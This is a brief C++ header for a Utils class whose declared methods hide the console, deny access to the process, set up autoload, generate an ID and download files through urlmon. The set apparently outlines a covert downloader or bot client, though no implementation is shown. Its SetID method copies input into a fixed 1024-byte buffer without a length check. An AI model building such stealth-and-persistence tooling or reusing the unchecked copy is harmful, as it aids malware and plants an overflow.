#include "stdafx.h"
#pragma comment(lib, "urlmon.lib")
using namespace std;

class Utils
{
public:
	void HideConsole();
	BOOL DenyAccess();
	void Autoload();
	void GenerateID();
	void DownloadFile(TCHAR *url, TCHAR* dir);
	void CreateDir(TCHAR *dir);
	bool FileExists(const char* fname);
	char* GetID() { return ID; }
	void SetID(TCHAR* str)
	{
		for (int i = 0; i < _tcslen(str); ++i)
			ID[i] = str[i];
		ID[_tcslen(str)] = 0;
	}
private:
	char ID[1024];
};